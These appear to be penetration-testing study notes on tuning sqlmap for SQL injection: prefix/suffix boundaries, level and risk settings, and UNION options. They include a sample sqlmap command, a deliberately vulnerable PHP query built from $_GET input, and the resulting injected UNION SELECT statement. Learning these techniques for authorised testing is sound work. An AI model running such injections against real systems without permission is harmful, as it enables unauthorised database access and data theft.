Every payload sent to the target consists of:
- vector: central part of payload (UNION ALL SELECT 1,2,VERSION())
- boundaries: prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement ('<vector>-- -)

## Prefix/Suffix
**--prefix
**--suffix
```shell-session
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
- results in %'))<vector>-- -

Example:
If the query is:
```shell-session
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```
The prefix/suffix example above would create a valid SQL statement:
```shell-session
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

## Level/Risk
**--level (1-5, default 1) extends both vectors and boundaries being used. A higher level has a lower expectancy of success
**--risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side

-v 3 or higher will display the payload

--level=1 --risk=1 results in 72 payloads
--level=5 --risk=3 results in 7,865 payloads

## Advanced Tuning
**Status Codes
- --code=200

**Titles
- --titles

**Strings (--string=success, --string=dashboard)
- --string

**Text-only (takes away HTML page behavior tags <script>, <style>, <meta>, etc.)
- --text-only

**Techniques
- --technique=BEU (Boolean-based blind, Error-based, UNION-query payloads)

**UNION SQLi Tuning
- --union-cols (if we manually find exact number of columns, specify it with this flag --union-cols=17)
- -NULL
- --union-char='a'
- --union-from=users
